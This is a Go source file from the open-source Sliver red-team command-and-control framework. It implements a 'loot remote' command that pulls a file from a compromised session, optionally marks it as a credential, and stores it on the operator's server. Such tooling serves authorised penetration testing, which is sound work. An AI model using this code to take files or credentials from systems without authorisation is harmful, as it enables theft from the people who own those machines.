package loot

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox
	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.
	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.
	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"path"

	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/log"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util/encoders"
)

// Remote - Add a remote file from the current session to the server's loot store
type Remote struct {
	Positional struct {
		RemotePath string `description:"remote session path to file to add as loot" required:"1-1"`
	} `positional-args:"true" required:"true"`
	Options struct {
		Name     string `long:"name" short:"n" description:"Name of this piece of loot"`
		Type     string `long:"type" short:"t" description:"force a specific loot type (file/cred)"`
		FileType string `long:"file-type" short:"f" description:"force a specific file type (binary/text)"`
	} `group:"local loot options"`
}

// Execute - Add a remote file from the current session to the server's loot store
func (l *Remote) Execute(args []string) (err error) {
	session := core.ActiveTarget.Session()
	if session == nil {
		return log.Errorf("No active session")
	}
	remotePath := l.Positional.RemotePath
	name := l.Options.Name
	if name == "" {
		name = path.Base(remotePath)
	}

	var lootType clientpb.LootType
	lootTypeStr := l.Options.Type
	if lootTypeStr != "" {
		lootType, err = lootTypeFromHumanStr(lootTypeStr)
		if err == ErrInvalidLootType {
			return log.Errorf("Invalid loot type: %s", lootTypeStr)
		}
	} else {
		lootType = clientpb.LootType_LOOT_FILE
	}

	ctrl := make(chan bool)
	log.SpinUntil(fmt.Sprintf("Looting remote file %s", remotePath), ctrl)

	download, err := transport.RPC.Download(context.Background(), &sliverpb.DownloadReq{
		Request: core.ActiveTarget.Request(),
		Path:    remotePath,
	})
	if err != nil {
		ctrl <- true
		<-ctrl
		if err != nil {
			return log.Errorf("Failed to download loot from session: %s", err) // Download failed
		}
	}

	if download.Encoder == "gzip" {
		download.Data, err = new(encoders.Gzip).Decode(download.Data)
		if err != nil {
			return log.Errorf("Decoding failed: %s", err)
		}
	}

	// Determine type based on download buffer
	lootFileType, err := lootFileTypeFromHumanStr(l.Options.FileType)
	if lootFileType == -1 || err != nil {
		if isText(download.Data) {
			lootFileType = clientpb.FileType_TEXT
		} else {
			lootFileType = clientpb.FileType_BINARY
		}
	}
	loot := &clientpb.Loot{
		Name:     name,
		Type:     lootType,
		FileType: lootFileType,
		File: &commonpb.File{
			Name: path.Base(remotePath),
			Data: download.Data,
		},
	}
	if lootType == clientpb.LootType_LOOT_CREDENTIAL {
		loot.CredentialType = clientpb.CredentialType_FILE
	}

	loot, err = transport.RPC.LootAdd(context.Background(), loot)
	ctrl <- true
	<-ctrl
	if err != nil {
		return log.Errorf("Failed to add loot to the store: %s", err)
	}

	log.Infof("Successfully added loot to server: %s (%s) [%s]", loot.Name, loot.LootID, loot.Type.String())
	return
}
